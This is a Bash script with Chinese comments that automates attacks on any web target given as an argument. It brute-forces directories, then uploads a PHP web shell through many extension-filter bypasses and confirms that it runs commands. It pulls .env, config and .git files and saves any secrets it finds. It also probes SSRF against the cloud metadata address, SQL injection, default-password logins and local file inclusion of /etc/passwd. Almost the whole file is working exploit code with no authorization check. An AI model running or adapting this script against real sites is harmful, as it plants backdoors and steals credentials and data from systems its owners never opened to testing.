#!/bin/bash
# 改进版深度测试脚本 - 解决所有问题

TARGET="$1"
OUT_DIR="/root/manual_test/results"
mkdir -p "$OUT_DIR"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 深度测试: $TARGET"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 标准化URL
if [[ ! "$TARGET" =~ ^https?:// ]]; then
    TARGET="https://$TARGET"
fi
DOMAIN=$(echo "$TARGET" | sed 's|^https\?://||' | cut -d/ -f1 | cut -d: -f1)
FLAG=$(echo "$TARGET" | md5sum | cut -c1-8)

RESULT_FILE="$OUT_DIR/${DOMAIN}_shells.txt"
> "$RESULT_FILE"

WORK_DIR="/tmp/test_${FLAG}"
mkdir -p "$WORK_DIR"

# 函数：提取shell URL（支持JSON/XML/Location/相对路径）
extract_shell_url() {
    local resp="$1"
    local base_url="$2"
    
    # 1. JSON格式: {"file":"/uploads/shell.php"} 或 {"url":"http://..."}
    echo "$resp" | grep -oE '"(file|url|path|location|src)":\s*"([^"]+\.(php|phtml|php5|aspx|jsp))"' | \
        sed 's/.*":\s*"\(.*\)"/\1/' | while read url; do
            [[ "$url" =~ ^http ]] && echo "$url" || echo "${base_url}${url#/}"
        done
    
    # 2. XML格式: <url>/files/shell.php</url>
    echo "$resp" | grep -oE '<(url|file|path|location)>([^<]+\.(php|phtml|php5|aspx|jsp))</' | \
        sed 's/.*>\(.*\)</\1/' | while read url; do
            [[ "$url" =~ ^http ]] && echo "$url" || echo "${base_url}${url#/}"
        done
    
    # 3. 完整URL
    echo "$resp" | grep -oE "(http[s]?://[^\"' ]+\.(php|phtml|php5|aspx|jsp))"
    
    # 4. 相对路径: uploads/2025/shell.php
    echo "$resp" | grep -oE "(uploads|files|images|media|attachments)/[^\"' ]+\.(php|phtml|php5|aspx|jsp)" | \
        while read rel_path; do
            echo "${base_url}/${rel_path}"
        done
    
    # 5. 绝对路径: /uploads/shell.php
    echo "$resp" | grep -oE "(/[^\"' ]+/(uploads|files|images|media|attachments)/[^\"' ]+\.(php|phtml|php5|aspx|jsp))" | \
        while read abs_path; do
            echo "${base_url}${abs_path}"
        done
}

# 函数：验证shell是否真的可用
verify_shell() {
    local shell_url="$1"
    local test_cmd="echo%20${FLAG}"
    
    # 测试1: GET参数
    test_resp=$(curl -skL -m 5 "${shell_url}?0=${test_cmd}" 2>/dev/null)
    if echo "$test_resp" | grep -q "${FLAG}"; then
        echo "[✅ Shell验证成功] $shell_url"
        return 0
    fi
    
    # 测试2: POST参数
    test_resp=$(curl -skL -m 5 -X POST "$shell_url" -d "0=${test_cmd}" 2>/dev/null)
    if echo "$test_resp" | grep -q "${FLAG}"; then
        echo "[✅ Shell验证成功] $shell_url"
        return 0
    fi
    
    return 1
}

echo "[阶段1/5] 🔍 目录扫描发现真实路径..."
SCAN_FILE="$WORK_DIR/dir_scan.txt"
> "$SCAN_FILE"

# 使用常见目录字典
COMMON_DIRS="/admin /administrator /wp-admin /wp-login.php /phpmyadmin /cpanel /manager /control /panel /dashboard /backend /login /api /upload /fileupload /files /uploads /images /media /attachments /includes /modules /components /assets /static /public /private /secure /admin/upload /admin/files /includes/upload /modules/upload /components/upload /api/upload /api/file /api/files /rest/upload /v1/upload /v2/upload"

for dir in $COMMON_DIRS; do
    status=$(curl -skL -m 3 -o /dev/null -w "%{http_code}" "${TARGET}${dir}" 2>/dev/null)
    if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ] || [ "$status" = "403" ] || [ "$status" = "401" ]; then
        echo "${TARGET}${dir}|${status}" >> "$SCAN_FILE"
    fi
done

# 如果ffuf可用，进行深度扫描
if command -v ffuf &> /dev/null; then
    echo "  使用ffuf深度扫描..."
    ffuf -u "${TARGET}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
        -mc 200,301,302,403,401 -t 50 -s -o "$WORK_DIR/ffuf.json" -of json 2>/dev/null | \
        jq -r '.results[]? | "\(.url)|\(.status)"' 2>/dev/null >> "$SCAN_FILE" || true
fi

echo "[阶段2/5] 📄 分析页面结构提取功能点..."
PAGE_LINKS="$WORK_DIR/page_links.txt"
> "$PAGE_LINKS"

# 提取主页所有链接
curl -skL -m 5 "$TARGET" 2>/dev/null | \
    grep -oE 'href=["'\'']([^"'\'']+)["'\'']|src=["'\'']([^"'\'']+)["'\'']' | \
    sed 's/href=["'\'']\(.*\)["'\'']/\1/' | sed 's/src=["'\'']\(.*\)["'\'']/\1/' | \
    grep -E '^/|^http' | sort -u >> "$PAGE_LINKS"

# 提取JS文件中的API端点
curl -skL -m 5 "$TARGET" 2>/dev/null | \
    grep -oE 'src=["'\'']([^"'\'']+\.js)["'\'']' | \
    sed 's/.*src=["'\'']\(.*\)["'\'']/\1/' | while read js_path; do
        [[ "$js_path" =~ ^http ]] || js_path="${TARGET}/${js_path#/}"
        curl -skL -m 5 "$js_path" 2>/dev/null | \
            grep -oE '/api/[a-zA-Z0-9/_-]+|/upload|/file|/files' | sort -u >> "$PAGE_LINKS"
    done

UPLOAD_PATHS=$(cat "$SCAN_FILE" "$PAGE_LINKS" 2>/dev/null | grep -iE "upload|file|upload" | cut -d'|' -f1 | sort -u | head -20)
echo "  发现 ${#UPLOAD_PATHS[@]} 个潜在上传路径"

echo "[阶段3/5] 📤 文件上传测试（10+种绕过）..."
UPLOAD_BYPASSES=(
    "php"
    "phtml"
    "php5"
    "php3"
    "phar"
    "PhP"
    "pHp"
    "php."
    "php%00.jpg"
    "php.jpg"
    "php.jpeg"
    "php.png"
    "php.gif"
    "php%00"
    "php "
    "php%0a"
)

for upload_path in $UPLOAD_PATHS; do
    [ -z "$upload_path" ] && continue
    
    for bypass_ext in "${UPLOAD_BYPASSES[@]}"; do
        tmp_file="$WORK_DIR/u_${FLAG}.${bypass_ext}"
        printf '%s\n' "<?php echo \"U${FLAG}\";@system(\$_GET[0]); ?>" > "$tmp_file"
        
        # 测试多种POST参数名
        for param_name in file upload fileupload image photo attachment document; do
            # 标准multipart
            resp=$(curl -skL -m 10 -X POST "$upload_path" \
                -F "${param_name}=@$tmp_file" \
                -F "upload=@$tmp_file" \
                -F "fileType=Photo" \
                -H "User-Agent: Mozilla/5.0" \
                -w "\n%{http_code}\n%{redirect_url}\n" 2>&1)
            
            http_code=$(echo "$resp" | tail -2 | head -1)
            redirect_url=$(echo "$resp" | tail -1)
            resp_body=$(echo "$resp" | head -n -2)
            
            # 检查HTTP状态码
            if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "302" ]; then
                # 提取shell URL（支持所有格式）
                shell_urls=$(extract_shell_url "$resp_body" "$TARGET")
                
                # 如果有Location头
                if [ -n "$redirect_url" ] && [[ "$redirect_url" =~ \.(php|phtml|php5|aspx|jsp)$ ]]; then
                    shell_urls="$shell_urls
$redirect_url"
                fi
                
                # 验证每个shell
                echo "$shell_urls" | grep -v "^$" | while read shell_url; do
                    if verify_shell "$shell_url"; then
                        echo "[✅ 文件上传成功] $shell_url (路径: $upload_path, 绕过: $bypass_ext)" | tee -a "$RESULT_FILE"
                    fi
                done
            fi
        done
    done
done
rm -f "$WORK_DIR"/u_*

echo "[阶段4/5] 🔓 敏感文件泄露（修复误报）..."
for file in .env .env.local .env.production config.php wp-config.php configuration.php database.yml application.properties web.config .git/config .git/HEAD .DS_Store; do
    resp=$(curl -skL -m 5 "$TARGET/$file" 2>/dev/null)
    http_code=$(curl -skL -m 5 -o /dev/null -w "%{http_code}" "$TARGET/$file" 2>/dev/null)
    
    # 修复：排除404页面
    if [ "$http_code" = "200" ] && [ ${#resp} -gt 50 ]; then
        # 检查是否真的是敏感文件（不是404页面）
        if ! echo "$resp" | grep -qiE "404|not found|error 404"; then
            if echo "$resp" | grep -qiE "password|secret|api[_-]?key|db[_-]?pass|mysql|database|connection"; then
                echo "[✅ 敏感文件泄露] $TARGET/$file" | tee -a "$RESULT_FILE"
                echo "$resp" | head -30 >> "$RESULT_FILE"
            fi
        fi
    fi
done

echo "[阶段5/5] 🔌 未授权API + 其他测试..."
# 从扫描结果中提取API路径
API_PATHS=$(cat "$SCAN_FILE" 2>/dev/null | grep -iE "api|rest|graphql|swagger" | cut -d'|' -f1 | head -20)

for api in $API_PATHS; do
    [ -z "$api" ] && continue
    resp=$(curl -skL -m 5 "$api" 2>/dev/null)
    if [ ${#resp} -gt 10 ] && echo "$resp" | grep -qE "\{|\["; then
        if ! echo "$resp" | grep -qiE "login|unauthorized|forbidden|401|403"; then
            echo "[✅ 未授权API] $api" | tee -a "$RESULT_FILE"
        fi
    fi
done

# Git泄露
for git_path in .git/config .git/HEAD .git/index; do
    resp=$(curl -skL -m 5 "$TARGET/$git_path" 2>/dev/null)
    if echo "$resp" | grep -qE "\[core\]|ref:|commit"; then
        echo "[✅ Git泄露] $TARGET/$git_path" | tee -a "$RESULT_FILE"
    fi
done

# SSRF
for ssrf_path in /api/fetch /api/proxy /api/download /api/curl; do
    resp=$(curl -skL -m 5 "$TARGET${ssrf_path}?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
    if echo "$resp" | grep -qiE "instance-id|ami-id|access"; then
        echo "[✅ SSRF成功] $TARGET${ssrf_path}" | tee -a "$RESULT_FILE"
    fi
done

# SQL注入
params=$(echo "$TARGET" | grep -oE "[?&][a-zA-Z0-9_]+=" | sed 's/[?&]//g' | sed 's/=//g' | sort -u)
if [ -z "$params" ]; then
    params="id user page cat"
fi
for param in $params; do
    resp=$(curl -skL -m 5 "$TARGET?${param}=1'" 2>/dev/null)
    if echo "$resp" | grep -qiE "mysql|postgresql|sql syntax|sql error"; then
        echo "[✅ SQL注入] $TARGET?${param}=1'" | tee -a "$RESULT_FILE"
    fi
done

# 弱口令（从扫描结果中提取登录路径）
LOGIN_PATHS=$(cat "$SCAN_FILE" 2>/dev/null | grep -iE "login|admin|wp-login|administrator" | cut -d'|' -f1 | head -10)
for login_path in $LOGIN_PATHS; do
    [ -z "$login_path" ] && continue
    for cred in "admin:admin" "admin:123456" "root:root" "administrator:password"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        resp=$(curl -skL -m 5 -X POST "$login_path" \
            -d "username=$user&password=$pass" \
            -d "user=$user&pass=$pass" \
            -d "log=$user&pwd=$pass" \
            -L 2>/dev/null)
        if echo "$resp" | grep -qiE "dashboard|welcome|logout|success" && ! echo "$resp" | grep -qiE "error|invalid|failed"; then
            echo "[✅ 弱口令] $login_path ($user:$pass)" | tee -a "$RESULT_FILE"
        fi
    done
done

# LFI
for param in file path page include; do
    resp=$(curl -skL -m 5 "$TARGET?${param}=../../../../etc/passwd" 2>/dev/null)
    if echo "$resp" | grep -qE "root:.*:0:0:"; then
        echo "[✅ LFI成功] $TARGET?${param}" | tee -a "$RESULT_FILE"
    fi
done

shell_count=$(wc -l < "$RESULT_FILE" 2>/dev/null || echo 0)
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ $DOMAIN 测试完成，发现 $shell_count 个结果"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
if [ "$shell_count" -gt 0 ]; then
    cat "$RESULT_FILE"
fi

rm -rf "$WORK_DIR"
